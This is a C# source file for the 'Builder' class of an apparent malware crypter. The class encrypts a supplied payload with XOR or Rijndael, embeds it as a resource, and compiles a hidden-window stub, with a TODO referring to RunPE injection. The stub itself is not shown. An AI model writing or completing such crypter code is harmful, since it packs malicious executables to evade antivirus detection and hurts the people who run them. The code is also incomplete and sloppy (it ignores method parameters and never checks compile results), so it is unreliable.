using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Resources;
using System.Text;
using System.Threading.Tasks;

namespace Crypt
{
    class Builder
    {
        Byte[] payload;
        Options options;

        public Builder(byte[] payload, Options options)
        {
            this.payload = payload;
            this.options = options;
        }

        public bool Build()
        {
            Byte[] encryptedPL = Encrypt(payload, options.encryptionType);
            //TODO: add info to stub/runpe
            bool result = Compile(encryptedPL);
            return result;
        }

        private byte[] Encrypt(Byte[] input, EncryptionType encryptionType)
        {
            Byte[] encryptedPL;
            switch (options.encryptionType)
            {
                case EncryptionType.Rijndael:
                    encryptedPL = Encryption.RijndaelEncrypt(payload, options.encryptionKey);
                    break;
                case EncryptionType.XOR:
                default:
                    encryptedPL = Encryption.Xor(payload, options.encryptionKey);
                    break;
            }

            return encryptedPL;
        }

        private bool Compile(byte[] encryptedPL)
        {
            CompilerParameters compParams = new CompilerParameters();
            compParams.GenerateExecutable = true;
            compParams.TreatWarningsAsErrors = false;
            compParams.OutputAssembly = options.buildDir;
            compParams.CompilerOptions = "/optimize+ /platform:x86 /target:winexe /unsafe";

            compParams.ReferencedAssemblies.Add("System.dll");
            compParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compParams.ReferencedAssemblies.Add("System.Drawing.dll");

            Dictionary<string, string> providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v2.0");

            using (ResourceWriter resourceWriter = new ResourceWriter("yaes.resources"))
            {
                resourceWriter.AddResource("yaes", encryptedPL);
                resourceWriter.Generate();
            }

            string stubSrc = File.ReadAllText(@"D:\Libraries\Desktop\teststub.txt");

            CompilerResults compResults = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(compParams, stubSrc);

            return true;
        }
    }
}
